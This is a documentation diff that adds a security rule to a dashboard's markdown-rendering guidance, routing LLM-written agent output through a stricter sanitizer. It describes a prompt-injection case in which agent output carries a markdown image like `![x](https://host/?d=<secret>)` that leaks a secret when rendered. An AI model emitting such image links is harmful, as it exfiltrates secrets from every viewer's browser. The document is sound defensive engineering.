@@ -164,7 +164,7 @@ var issueNumber = {{ issue_number | tojson }};
 
 ### Rendered Markdown
 
-marked passes raw HTML in its input straight through, so its output must never reach `innerHTML` unsanitized. Render markdown only through the two helpers in `_head.html`: `renderMarkdown()` for blocks and `renderMarkdownInline()` for a single line. Both sanitize with DOMPurify and fall back to escaped text when either library failed to load. `tests/test_dashboard_script_injection.py` runs both helpers under node and fails if any other template or script calls `marked.parse()` or `marked.parseInline()` itself.
+marked passes raw HTML in its input straight through, so its output must never reach `innerHTML` unsanitized. Render markdown only through the two helpers in `_head.html`: `renderMarkdown()` for blocks and `renderMarkdownInline()` for a single line. Both sanitize with DOMPurify and fall back to escaped text when either library failed to load. Text an LLM wrote (agent output) goes through `renderMarkdown(text, {untrusted: true})`: sanitizing stops script execution but not outbound loads, and a prompt-injected `![x](https://host/?d=<secret>)` would make every viewer's browser fetch that URL on render. The untrusted path turns an image into a link to its URL, forbids every other tag and attribute that loads on render, and opens links in a new tab with `rel="noopener noreferrer"`. `tests/test_dashboard_script_injection.py` runs both helpers under node and fails if any other template or script calls `marked.parse()` or `marked.parseInline()` itself.
 
 ### Manifest Path Traversal
 
